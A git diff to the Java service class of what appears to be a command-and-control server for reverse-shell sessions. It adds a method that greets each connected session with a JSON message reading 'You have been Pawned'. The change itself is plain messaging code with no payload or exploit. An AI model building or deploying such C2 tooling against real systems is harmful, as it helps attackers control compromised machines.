@@ -1,5 +1,6 @@
 package com.mtattab.c2cServer.service.impl;
 
+import com.mtattab.c2cServer.model.InitialConnectionMessageModel;
 import com.mtattab.c2cServer.model.ManagerCommunicationModel;
 import com.mtattab.c2cServer.model.entity.SessionLogEntity;
 import com.mtattab.c2cServer.repository.SessionLogRepository;
@@ -97,6 +98,16 @@ public class ReverseShellClientHandlerServiceImpl implements ReverseShellClientH
 //
 //        }
 
+    }
+
+    public void sendIntialMessage(WebSocketSession session){
+        SocketUtil.sendMessage(session, new TextMessage(
+                DataManipulationUtil.convertObjectToJson(InitialConnectionMessageModel.builder()
+                        .sessionId(session.getId())
+                        .initialMessage("You have been Pawned")
+                        .build())
+
+        ));
     }
 
 
